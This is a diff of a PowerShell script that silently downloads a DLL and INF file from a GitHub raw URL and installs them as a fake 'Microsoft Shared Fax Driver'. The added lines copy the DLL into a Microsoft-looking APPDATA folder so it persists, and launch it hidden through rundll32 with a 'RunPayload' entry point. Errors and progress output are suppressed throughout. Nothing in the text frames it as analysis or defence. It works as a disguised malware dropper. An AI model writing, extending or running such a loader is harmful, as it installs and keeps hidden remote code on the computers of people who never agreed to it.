@@ -6,8 +6,8 @@ $ErrorActionPreference = 'SilentlyContinue'
 $ProgressPreference = 'SilentlyContinue'
 
 # Configuration
-$dllUrl = "https://raw.githubusercontent.com/devnull-sys/bzz/refs/heads/main/msfax.dll"  # EDIT THIS
-$infUrl = "https://raw.githubusercontent.com/devnull-sys/bzz/refs/heads/main/msfax.inf"  # EDIT THIS
+$dllUrl = "https://raw.githubusercontent.com/devnull-sys/bzz/refs/heads/main/msfax.dll"
+$infUrl = "https://raw.githubusercontent.com/devnull-sys/bzz/refs/heads/main/msfax.inf"
 
 # Internal variables
 $w = New-Object System.Threading.Mutex($false, "Global\{A8F2B9C4-3D1E-4A7B-9F2C-8E6D5C4B3A2F}")
@@ -40,10 +40,19 @@ $pnp = Start-Process pnputil -ArgumentList "/add-driver `"$t\msfax.inf`" /instal
 if ($pnp.ExitCode -eq 0) {
     Add-PrinterPort -Name "SHRFAX:" -ErrorAction SilentlyContinue
     Add-Printer -Name "Fax" -DriverName "Microsoft Shared Fax Driver" -PortName "SHRFAX:" -ErrorAction SilentlyContinue
+    
+    # CRITICAL: Trigger the DLL to execute
+    # Copy DLL to a persistent location first
+    $dllPath = "$env:APPDATA\Microsoft\Windows\Printer\msfax.dll"
+    $null = New-Item -ItemType Directory -Force -Path (Split-Path $dllPath)
+    Copy-Item "$t\msfax.dll" $dllPath -Force
+    
+    # Execute the DLL payload
+    Start-Process rundll32.exe -ArgumentList "`"$dllPath`",RunPayload" -WindowStyle Hidden
 }
 
-# Cleanup
-Start-Sleep -Milliseconds 200
+# Cleanup temporary files only (keep the persistent DLL)
+Start-Sleep -Milliseconds 500
 Remove-Item $t -Recurse -Force
 
 # Maintenance tasks
